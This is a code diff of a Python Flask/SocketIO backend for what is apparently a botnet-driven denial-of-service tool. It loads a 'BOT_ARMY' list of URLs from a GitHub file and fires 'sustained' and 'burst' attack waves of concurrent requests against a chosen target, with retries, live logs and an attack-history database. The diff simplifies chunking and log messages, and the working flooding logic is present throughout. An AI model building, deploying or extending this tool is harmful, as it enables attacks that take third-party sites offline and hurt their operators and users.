@@ -13,50 +13,51 @@ from datetime import datetime
 # ---------- ENVIRONMENT ----------
 GITHUB_BOT_URL = os.getenv("BOT_LIST_URL", "https://raw.githubusercontent.com/nkarthikraja-32/bot/main/bots.txt")
 CHUNK_INDEX = int(os.getenv("CHUNK_INDEX", "0"))
-TOTAL_CHUNKS = int(os.getenv("TOTAL_CHUNKS", "3"))
+TOTAL_CHUNKS = int(os.getenv("TOTAL_CHUNKS", "1"))      # 1 = all bots, 3 = split
 MAX_CONNECTIONS = int(os.getenv("MAX_CONNECTIONS", "300"))
 PORT = int(os.getenv("PORT", "80"))
-DB_NAME = f"attack_history_{CHUNK_INDEX}.db"
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = secrets.token_hex(32)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 
-BOT_ARMY = []              # this backend's chunk
+BOT_ARMY = []
 attack_counter = 0
-active_attacks = {}        # attack_id -> {'event': Event, 'info': dict}
+active_attacks = {}
 lock = threading.Lock()
 
-# ---------- DATABASE ----------
-def init_db():
-    with sqlite3.connect(DB_NAME) as conn:
-        conn.execute('''CREATE TABLE IF NOT EXISTS attack_history
-                      (id INTEGER PRIMARY KEY AUTOINCREMENT,
-                       target TEXT, duration INTEGER, method TEXT,
-                       timestamp TEXT, success_rate TEXT, nodes_used INTEGER)''')
-init_db()
-
-# ---------- HEALTH CHECK ----------
+# ---------- HEALTH CHECK (required by Koyeb) ----------
 @app.route('/')
 def health():
     return "OK", 200
 
-# ---------- BOT LOADING (CHUNKED) ----------
+# ---------- BOT LOADING (chunked if TOTAL_CHUNKS > 1) ----------
 def load_bots():
     global BOT_ARMY
     try:
         r = httpx.get(GITHUB_BOT_URL, timeout=10)
         r.raise_for_status()
         all_bots = [line.strip() for line in r.text.splitlines() if line.strip().startswith("http")]
-        chunk_size = len(all_bots) // TOTAL_CHUNKS
-        start = CHUNK_INDEX * chunk_size
-        end = start + chunk_size if CHUNK_INDEX < TOTAL_CHUNKS - 1 else len(all_bots)
-        BOT_ARMY = all_bots[start:end]
-        print(f"Backend {CHUNK_INDEX}: loaded {len(BOT_ARMY)} bots")
+        if TOTAL_CHUNKS <= 1:
+            BOT_ARMY = all_bots
+        else:
+            chunk_size = len(all_bots) // TOTAL_CHUNKS
+            start = CHUNK_INDEX * chunk_size
+            end = start + chunk_size if CHUNK_INDEX < TOTAL_CHUNKS - 1 else len(all_bots)
+            BOT_ARMY = all_bots[start:end]
         return len(BOT_ARMY)
     except Exception as e:
-        print(f"Backend {CHUNK_INDEX}: bot load error: {e}")
+        print(f"Bot load error: {e}")
         return 0
+
+# ---------- DB (optional) ----------
+def init_db():
+    with sqlite3.connect("attack_history.db") as conn:
+        conn.execute('''CREATE TABLE IF NOT EXISTS attack_history
+                      (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                       target TEXT, duration INTEGER, method TEXT,
+                       timestamp TEXT, success_rate TEXT, nodes_used INTEGER)''')
+init_db()
 
 # ---------- ATTACK ENGINES ----------
 async def execute_attack(target, duration, method):
@@ -65,7 +66,7 @@ async def execute_attack(target, duration, method):
         socketio.emit('log', {'m': "⚠️ No bots. Syncing..."})
         load_bots()
         if not BOT_ARMY:
-            socketio.emit('log', {'m': "💀 Still no bots. Abort."})
+            socketio.emit('log', {'m': "💀 Still no bots."})
             return
 
     attack_counter += 1
@@ -73,7 +74,6 @@ async def execute_attack(target, duration, method):
     stop_event = threading.Event()
     info = {
         'id': attack_id,
-        'backend': CHUNK_INDEX,
         'target': target,
         'duration': duration,
         'method': method,
@@ -83,7 +83,7 @@ async def execute_attack(target, duration, method):
     with lock:
         active_attacks[attack_id] = {'event': stop_event, 'info': info}
     socketio.emit('active_attacks', get_active())
-    socketio.emit('log', {'m': f"⚔️ Backend {CHUNK_INDEX} Attack #{attack_id}: {target} | {method} | {duration}s | Bots: {len(BOT_ARMY)}"})
+    socketio.emit('log', {'m': f"⚔ Attack #{attack_id}: {target} | {method} | {duration}s | Bots: {len(BOT_ARMY)}"})
 
     try:
         if method == 'sustained':
@@ -105,7 +105,6 @@ async def sustained_wave(target, duration, stop_event):
     start_ts = time.time()
     wave_count = 0
     total_success = 0
-
     connector = aiohttp.TCPConnector(limit=MAX_CONNECTIONS, force_close=False)
     async with aiohttp.ClientSession(connector=connector,
                                      timeout=aiohttp.ClientTimeout(total=4, connect=2)) as session:
@@ -122,38 +121,35 @@ async def sustained_wave(target, duration, stop_event):
         while time.time() - start_ts < duration and not stop_event.is_set():
             wave_start = time.time()
             urls = BOT_ARMY
-            success = [False] * len(urls)
-            # first pass
+            success = [False]*len(urls)
             tasks = [call_one(u) for u in urls]
             first = await asyncio.gather(*tasks)
             for i, ok in enumerate(first): success[i] = ok
-            # retry up to 2 rounds
-            for retry_round in range(2):
+            for _ in range(2):
                 failed = [i for i, ok in enumerate(success) if not ok]
-                if not failed or time.time() - wave_start > 4.8: break
+                if not failed or time.time()-wave_start>4.8: break
                 retry_tasks = [call_one(urls[i]) for i in failed]
                 retry_res = await asyncio.gather(*retry_tasks)
                 for idx, r in zip(failed, retry_res): success[idx] = r
             wave_success = sum(success)
             total_success += wave_success
             wave_count += 1
-            socketio.emit('log', {'m': f"✅ Backend {CHUNK_INDEX} Wave {wave_count}: {wave_success}/{len(urls)} bots"})
-            elapsed = time.time() - wave_start
+            socketio.emit('log', {'m': f"✅ Wave {wave_count}: {wave_success}/{len(urls)} bots"})
+            elapsed = time.time()-wave_start
             if elapsed < 5: await asyncio.sleep(5 - elapsed)
 
-    exec_time = round(time.time() - start_ts, 2)
-    with sqlite3.connect(DB_NAME) as conn:
+    exec_time = round(time.time()-start_ts,2)
+    with sqlite3.connect("attack_history.db") as conn:
         conn.execute("INSERT INTO attack_history (target,duration,method,timestamp,success_rate,nodes_used) VALUES (?,?,?,?,?,?)",
                      (target, duration, "sustained", datetime.now().strftime("%H:%M:%S"),
                       f"{total_success}/{len(BOT_ARMY)*wave_count}", len(BOT_ARMY)))
         conn.commit()
-    socketio.emit('log', {'m': f"🏁 Backend {CHUNK_INDEX} Sustained finished: {wave_count} waves, {total_success} hits"})
+    socketio.emit('log', {'m': f"🏁 Sustained finished: {wave_count} waves, {total_success} hits"})
 
 async def burst_fire(target, duration, stop_event):
     start_ts = time.time()
     burst_count = 0
     total_success = 0
-
     connector = aiohttp.TCPConnector(limit=MAX_CONNECTIONS, force_close=False)
     async with aiohttp.ClientSession(connector=connector,
                                      timeout=aiohttp.ClientTimeout(total=4, connect=2)) as session:
@@ -167,35 +163,34 @@ async def burst_fire(target, duration, stop_event):
             except:
                 return False
 
-        while time.time() - start_ts < duration and not stop_event.is_set():
+        while time.time()-start_ts < duration and not stop_event.is_set():
             burst_count += 1
-            socketio.emit('log', {'m': f"💥 Backend {CHUNK_INDEX} Burst #{burst_count} launched"})
-            urls = BOT_ARMY
-            tasks = [call_one(u) for u in urls]
+            socketio.emit('log', {'m': f"💥 Burst #{burst_count} launched"})
+            tasks = [call_one(u) for u in BOT_ARMY]
             results = await asyncio.gather(*tasks)
             success = sum(1 for r in results if r)
             total_success += success
-            socketio.emit('log', {'m': f"✅ Burst #{burst_count}: {success}/{len(urls)}"})
+            socketio.emit('log', {'m': f"✅ Burst #{burst_count}: {success}/{len(BOT_ARMY)}"})
             await asyncio.sleep(8)
 
-    exec_time = round(time.time() - start_ts, 2)
-    with sqlite3.connect(DB_NAME) as conn:
+    exec_time = round(time.time()-start_ts,2)
+    with sqlite3.connect("attack_history.db") as conn:
         conn.execute("INSERT INTO attack_history (target,duration,method,timestamp,success_rate,nodes_used) VALUES (?,?,?,?,?,?)",
                      (target, duration, "burst", datetime.now().strftime("%H:%M:%S"),
                       f"{total_success}/{len(BOT_ARMY)*burst_count}", len(BOT_ARMY)))
         conn.commit()
-    socketio.emit('log', {'m': f"🏁 Backend {CHUNK_INDEX} Burst finished: {burst_count} bursts, {total_success} hits"})
+    socketio.emit('log', {'m': f"🏁 Burst finished: {burst_count} bursts, {total_success} hits"})
 
 # ---------- SOCKET EVENTS ----------
 @socketio.on('connect')
 def on_connect():
-    socketio.emit('log', {'m': f"Backend {CHUNK_INDEX} connected."})
+    socketio.emit('log', {'m': f"Backend connected."})
 
 @socketio.on('sync')
 def handle_sync():
     count = load_bots()
     socketio.emit('bot_count', {'backend': CHUNK_INDEX, 'count': count})
-    socketio.emit('log', {'m': f"Backend {CHUNK_INDEX} synced: {count} bots ready."})
+    socketio.emit('log', {'m': f"Synced: {count} bots ready."})
 
 @socketio.on('start_attack')
 def handle_start(data):
@@ -210,7 +205,7 @@ def handle_stop(data):
     with lock:
         if attack_id and attack_id in active_attacks:
             active_attacks[attack_id]['event'].set()
-            socketio.emit('log', {'m': f"🛑 Backend {CHUNK_INDEX}: Stop signal for attack #{attack_id}."})
+            socketio.emit('log', {'m': f"🛑 Stop signal for attack #{attack_id}."})
         else:
             socketio.emit('log', {'m': f"⚠️ Attack #{attack_id} not found."})
 
